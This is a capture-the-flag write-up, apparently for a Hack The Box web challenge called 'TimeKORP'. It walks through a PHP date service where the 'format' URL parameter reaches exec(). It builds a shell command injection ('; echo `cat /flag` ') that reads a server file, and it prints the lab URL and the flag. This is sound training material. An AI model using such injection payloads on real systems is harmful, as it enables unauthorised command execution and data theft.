# TimeKORP

Are you ready to unravel the mysteries and expose the truth hidden within
KROP's digital domain? Join the challenge and prove your prowess in the world
of cybersecurity. Remember, time is money, but in this case, the rewards may be
far greater than you imagine.

## How to Play

This is a php server. let's find how the current date is programmed.

In the 'challenge/index.php' file, the `$router->new('GET', '/', 'TimeController@index');`
Points to the 'challenge/controllers/TimeController.php' file. In the `index`
method, `isset($_GET['format'])` is going to read a URL parameter. The
`$time = new TimeModel($format);` will create a new `TimeModel` object with the
`$format` parameter. In the `challenge/models/TimeModel.php` the class
constructor will set the `$format` property to the `$format` parameter. The
`$time = exec($this->command);` will execute the `$command` property. We can
inject a command in the URL parameter.

The command is `"date '+" . $format . "' 2>&1";` so we can inject a format
string. The injection should be a valid bash command.

We can control `format so let's remove it.

```bash
"date '+ <bad_input> ' 2>&1";
```
First need to close both single quotes.

```bash
"date '+' <bad_input> '' 2>&1";
```

Cancel the previous command by adding a semicolon.

```bash
"date '+'; <bad_input> '' 2>&1";
```

From the `./Dockerfile` It's known that the flag is in the `/flag` file.

```bash
"date '+'; echo `cat /flag` '' 2>&1";
```

This will execute the subcommand `cat /flag` and echo the result.

The url is

```php
94.237.59.1:51145/?format=%Y-%m-%d
```

To inject the command, the url will be any change in the format parameter.

```php
http://94.237.59.1:51145/?format='; echo `cat /flag` '
```

## Flag

```
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}
```
